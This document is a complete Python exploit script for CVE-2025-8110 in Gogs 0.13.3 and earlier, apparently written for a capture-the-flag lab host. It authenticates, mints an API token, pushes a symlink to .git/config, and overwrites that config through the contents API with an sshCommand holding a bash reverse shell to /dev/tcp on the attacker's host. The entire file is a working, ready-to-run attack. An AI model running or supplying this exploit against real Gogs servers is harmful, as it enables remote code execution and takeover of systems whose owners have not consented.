#!/usr/bin/env python3
"""CVE-2025-8110 on Gogs <= 0.13.3 — relative symlink to .git/config + sshCommand.

Generic PoCs that write absolute hook paths (/data/gogs/..., /root/...) HTTP 500
on Ghostlink. This variant matches the working lab path:

  push malicious_link -> .git/config
  PUT /api/v1/repos/<user>/<repo>/contents/malicious_link
    body = gitconfig with sshCommand = reverse shell

Usage (lab):
  python3 gogs_cve_2025_8110_gitconfig.py \\
      --url http://gpz-op26-toolkits.ghostlink.htb \\
      --user USER --password PASS \\
      --lhost <TUN0_IP> --lport 4444

Needs: requests, beautifulsoup4, git.
"""
from __future__ import annotations

import argparse
import base64
import os
import shutil
import subprocess
import sys
from urllib.parse import quote, urlparse

import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def csrf(html: str) -> str:
    soup = BeautifulSoup(html, "html.parser")
    el = soup.select_one("input[name=_csrf]")
    if not el or not el.get("value"):
        raise ValueError("no CSRF")
    return el["value"]


def login(s: requests.Session, base: str, user: str, password: str) -> None:
    r = s.get(f"{base}/user/login")
    r = s.post(
        f"{base}/user/login",
        data={"_csrf": csrf(r.text), "user_name": user, "password": password},
        allow_redirects=True,
    )
    if "user/login" in r.url:
        raise ValueError("login failed")
    print("[+] authenticated", user)


def app_token(s: requests.Session, base: str) -> str:
    r = s.get(f"{base}/user/settings/applications")
    r = s.post(
        f"{base}/user/settings/applications",
        data={"_csrf": csrf(r.text), "name": os.urandom(8).hex()},
        allow_redirects=True,
    )
    print("[+] token HTTP", r.status_code)
    soup = BeautifulSoup(r.text, "html.parser")
    div = soup.find("div", class_="ui info message")
    if not div or not div.find("p"):
        raise ValueError("application token not found")
    token = div.find("p").text.strip()
    print("[+] token", token[:16] + "...")
    return token


def create_repo(s: requests.Session, base: str, token: str) -> str:
    name = os.urandom(6).hex()
    s.headers["Authorization"] = f"token {token}"
    r = s.post(
        f"{base}/api/v1/user/repos",
        json={
            "name": name,
            "description": "cve-2025-8110",
            "auto_init": True,
            "readme": "Default",
        },
    )
    print("[+] repo HTTP", r.status_code)
    if r.status_code not in (200, 201):
        raise ValueError(r.text[:300])
    return name


def push_symlink(base: str, user: str, password: str, repo: str) -> None:
    repo_dir = f"/tmp/{repo}"
    p = urlparse(base)
    u, pw = quote(user, safe=""), quote(password, safe="")
    clone = f"{p.scheme}://{u}:{pw}@{p.netloc}{p.path.rstrip('/')}/{user}/{repo}.git"
    if os.path.exists(repo_dir):
        shutil.rmtree(repo_dir)
    subprocess.run(["git", "clone", clone, repo_dir], check=True)
    os.symlink(".git/config", os.path.join(repo_dir, "malicious_link"))
    env = {
        **os.environ,
        "GIT_AUTHOR_NAME": "x",
        "GIT_AUTHOR_EMAIL": "x@x",
        "GIT_COMMITTER_NAME": "x",
        "GIT_COMMITTER_EMAIL": "x@x",
    }
    subprocess.run(["git", "add", "malicious_link"], cwd=repo_dir, check=True)
    subprocess.run(
        ["git", "commit", "-m", "Add malicious symlink"],
        cwd=repo_dir,
        check=True,
        env=env,
    )
    br = subprocess.check_output(
        ["git", "rev-parse", "--abbrev-ref", "HEAD"], cwd=repo_dir, text=True
    ).strip()
    subprocess.run(["git", "push", "origin", br], cwd=repo_dir, check=True)
    print("[+] pushed malicious_link -> .git/config", br)


def put_config(s: requests.Session, base: str, user: str, repo: str, command: str) -> None:
    git_config = f"""[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
	sshCommand = {command}
[remote "origin"]
	url = git@localhost:gogs/{repo}.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
	remote = origin
	merge = refs/heads/master
"""
    api = f"{base}/api/v1/repos/{user}/{repo}/contents/malicious_link"
    print("[+] PUT contents — check listener")
    try:
        s.put(
            api,
            json={
                "message": "Exploit CVE-2025-8110",
                "content": base64.b64encode(git_config.encode()).decode(),
            },
            headers={"Content-Type": "application/json"},
            timeout=8,
        )
    except requests.exceptions.ReadTimeout:
        print("[*] PUT timed out (often OK if reverse shell connected)")


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--user", required=True)
    ap.add_argument("--password", required=True)
    ap.add_argument("--lhost", required=True)
    ap.add_argument("--lport", required=True)
    args = ap.parse_args()
    base = args.url.rstrip("/")
    command = f"bash -c 'bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1' #"
    s = requests.Session()
    s.verify = False
    login(s, base, args.user, args.password)
    token = app_token(s, base)
    repo = create_repo(s, base, token)
    push_symlink(base, args.user, args.password, repo)
    put_config(s, base, args.user, repo, command)
    return 0


if __name__ == "__main__":
    sys.exit(main())
